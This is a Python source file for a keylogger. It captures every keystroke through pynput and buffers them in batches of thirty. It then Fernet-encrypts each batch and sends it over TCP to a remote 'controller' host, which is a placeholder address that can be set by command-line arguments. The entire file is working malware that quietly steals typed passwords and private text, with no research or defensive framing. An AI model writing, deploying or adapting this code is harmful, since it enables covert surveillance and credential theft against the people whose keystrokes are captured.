import argparse
import socket
import struct
import sys
from pynput import keyboard
from cryptography.fernet import Fernet

KEY = 'RANDOM_KEY'
fernet = Fernet(KEY)

parser = argparse.ArgumentParser(add_help=False)
parser.add_argument('--controller-host', dest='controller_host', default=None)
parser.add_argument('--controller-port', dest='controller_port', type=int, default=None)
args, _ = parser.parse_known_args()

HOST = args.controller_host if args.controller_host else "__ipaddr__"
PORT = args.controller_port if args.controller_port else 12345

payloads = []
counter = 0
keys = 30

s = None


def encrypt(data):
    return fernet.encrypt(data)


def send_data(conn, data: bytes):
    global s
    enc = encrypt(data)
    try:
        conn.send(struct.pack('>I', len(enc)))
        conn.send(enc)
    except Exception as e:
        print("[-] Connection established failed (send_data()) " + str(e))
        s = None


def flush_buffer(conn):
    global payloads
    if not payloads:
        return
    key_text = "".join(payloads)
    payloads = []
    send_data(conn, key_text.encode())


def control(conn, key):
    global counter
    global payloads
    counter += 1
    text = ""
    if key == keyboard.Key.enter:
        text = "\n"
    elif key == keyboard.Key.backspace:
        if payloads:
            payloads.pop()
    elif key == keyboard.Key.space:
        payloads.append(" ")
    else:
        text = str(key).strip("'")
        payloads.append(text)

    if counter >= keys:
        counter = 0
        flush_buffer(conn)


def ensure_connection():
    global s
    if s:
        return s
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connect((HOST, PORT))
        s = conn
        return s
    except Exception:
        s = None
        return None


def pressKey(key):
    conn = ensure_connection()
    if conn:
        control(conn, key)


def main():
    if not HOST or not PORT:
        return
    with keyboard.Listener(on_press=pressKey) as listener:
        listener.join()


if __name__ == '__main__':
    main()